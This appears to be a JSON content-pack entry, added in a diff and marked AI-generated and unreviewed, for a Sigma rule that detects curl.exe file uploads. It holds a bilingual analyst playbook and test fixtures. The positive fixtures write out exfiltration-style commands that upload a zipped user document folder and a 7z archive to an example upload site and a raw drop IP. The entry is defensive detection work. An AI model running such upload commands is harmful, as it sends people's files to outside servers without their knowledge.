@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "00bca14a-df4e-4649-9054-3f2aa676bc04",
+    "title": "Potential Data Exfiltration Via Curl.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Cedric MAURUGEON (Update)",
+    "path": "windows/process_creation/proc_creation_win_curl_fileupload.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_fileupload.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105",
+      "T1567"
+    ],
+    "folder": "rules-threat-hunting"
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó curl.exe con opciones que envían datos o archivos a un servidor remoto (-F, -T, -d, --form, --upload-file, --data*). Puede ser exfiltración de datos o un script legítimo de un desarrollador o administrador.",
+      "what_it_detects": "Creación de procesos donde Image termina en \\curl.exe o Product es 'The curl executable', y CommandLine incluye opciones de envío (--form, --upload-file, --data, --data-*, o -F/-T/-d con distinción de mayúsculas). Se excluyen los destinos localhost y 127.0.0.1. Es una regla de threat hunting.",
+      "why_it_matters": "curl viene incluido en Windows moderno, así que un atacante puede usarlo para subir archivos robados a un servicio web (T1567, exfiltración por servicio web) o para transferir herramientas y datos (T1105) sin instalar nada.",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique la URL o dominio de destino, el archivo enviado (@ruta o -T ruta) y los encabezados o tokens incluidos.",
+        "Evalúe el destino: ¿es un servicio interno o aprobado, o un sitio de intercambio de archivos, un webhook, una IP directa o un dominio recién registrado?",
+        "Revise ParentImage y la cadena de procesos: cmd, powershell, wscript, mshta o un documento de Office como padre son más sospechosos que un IDE o un agente de CI.",
+        "Verifique el usuario y el host: ¿es un desarrollador o administrador que usa curl habitualmente? Compare con ejecuciones históricas del mismo usuario.",
+        "Busque en el mismo host, +/- 15 minutos, compresión previa (7z, rar, Compress-Archive), recolección de archivos o volcados de credenciales.",
+        "Consulte la telemetría de red o proxy para la conexión de curl.exe: volumen de bytes salientes, IP de destino y respuesta del servidor.",
+        "Revise alertas anteriores del mismo host, usuario o dominio de destino."
+      ],
+      "false_positives": [
+        "Scripts de desarrolladores y administradores que prueban APIs REST con --data o -d.",
+        "Pipelines de CI/CD o tareas programadas que suben artefactos, logs o reportes a servidores internos aprobados.",
+        "Agentes de monitoreo o soporte que envían diagnósticos a un endpoint conocido del proveedor.",
+        "Pruebas de equipos de seguridad, como Atomic Red Team."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del host si la subida era esperada y cuál era su propósito.",
+        "Si no se justifica, aísle el endpoint y bloquee el dominio o IP de destino en proxy y firewall.",
+        "Preserve evidencia: el archivo subido, el script padre, el historial de comandos y los registros de proxy; determine qué datos salieron.",
+        "Elimine el mecanismo de ejecución (tarea programada, script, persistencia) y restablezca las credenciales que se hayan expuesto.",
+        "Si se confirma que salieron datos sensibles, escale a respuesta a incidentes y a protección de datos."
+      ],
+      "severity_rationale": "Nivel medio porque curl con opciones de subida es frecuente en el trabajo legítimo, aunque también es un método sencillo y real de exfiltración que merece revisión."
+    },
+    "en": {
+      "summary": "curl.exe ran with options that send data or files to a remote server (-F, -T, -d, --form, --upload-file, --data*). This may be data exfiltration or a legitimate developer or admin script.",
+      "what_it_detects": "Process creation where Image ends with \\curl.exe or Product is 'The curl executable', and CommandLine contains upload options (--form, --upload-file, --data, --data-*, or case-sensitive -F/-T/-d). Destinations on localhost and 127.0.0.1 are excluded. This is a threat-hunting rule.",
+      "why_it_matters": "curl ships with modern Windows, so attackers can use it to push stolen files to a web service (T1567, exfiltration over web service) or to transfer tools and data (T1105) without installing anything.",
+      "triage_steps": [
+        "Read the full CommandLine: note the destination URL or domain, the uploaded file (@path or -T path), and any headers or tokens.",
+        "Assess the destination: internal or approved service, or a file-sharing site, webhook, raw IP or newly registered domain?",
+        "Check ParentImage and the process tree: cmd, powershell, wscript, mshta or an Office parent is more suspicious than an IDE or CI agent.",
+        "Verify the user and host: is this a developer or admin who uses curl regularly? Compare with that user's history.",
+        "Search the same host within +/- 15 minutes for archiving (7z, rar, Compress-Archive), file collection or credential dumping beforehand.",
+        "Check proxy or network telemetry for the curl.exe connection: outbound bytes, destination IP and server response.",
+        "Review earlier alerts for the same host, user or destination domain."
+      ],
+      "false_positives": [
+        "Developer and admin scripts testing REST APIs with --data or -d.",
+        "CI/CD pipelines or scheduled tasks uploading artifacts, logs or reports to approved internal servers.",
+        "Monitoring or support agents sending diagnostics to a known vendor endpoint.",
+        "Security team testing, such as Atomic Red Team."
+      ],
+      "response_steps": [
+        "Confirm with the user or host owner whether the upload was expected and what it was for.",
+        "If unjustified, isolate the endpoint and block the destination domain or IP at the proxy and firewall.",
+        "Preserve evidence: uploaded file, parent script, command history and proxy logs; determine what data left.",
+        "Remove the execution mechanism (scheduled task, script, persistence) and reset any exposed credentials.",
+        "If sensitive data left the network, escalate to incident response and data protection."
+      ],
+      "severity_rationale": "Medium because curl upload flags are common in legitimate work, yet they are a simple, real exfiltration method worth reviewing."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "curl.exe uploads a zipped document folder to an external site with -F, launched from PowerShell.",
+        "event": {
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "Product": "The curl executable",
+          "CommandLine": "curl.exe -F \"file=@C:\\Users\\jperez\\AppData\\Local\\Temp\\docs.zip\" https://upload.example.com/u",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "User": "ANDES\\jperez",
+          "Computer": "WS-0142.andes.example.com",
+          "EventID": 1
+        }
+      },
+      {
+        "description": "curl.exe sends an archive with --upload-file to a raw documentation IP.",
+        "event": {
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "Product": "The curl executable",
+          "CommandLine": "curl.exe --upload-file C:\\ProgramData\\out.7z http://203.0.113.45/drop/",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "User": "ANDES\\mrojas",
+          "Computer": "WS-0207.andes.example.com",
+          "EventID": 1
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Developer posts JSON to a local API with --data; excluded by the localhost filter.",
+        "event": {
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "Product": "The curl executable",
+          "CommandLine": "curl.exe --data \"{\\\"name\\\":\\\"test\\\"}\" http://localhost:8080/api/items",
+          "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
+          "User": "ANDES\\lgomez",
+          "Computer": "DEV-0031.andes.example.com",
+          "EventID": 1
+        }
+      },
+      {
+        "description": "curl.exe only downloads a file with -o; no upload options present.",
+        "event": {
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "Product": "The curl executable",
+          "CommandLine": "curl.exe -L -o C:\\Temp\\installer.msi https://downloads.example.org/installer.msi",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "User": "ANDES\\jperez",
+          "Computer": "WS-0142.andes.example.com",
+          "EventID": 1
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-30T20:24:07+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
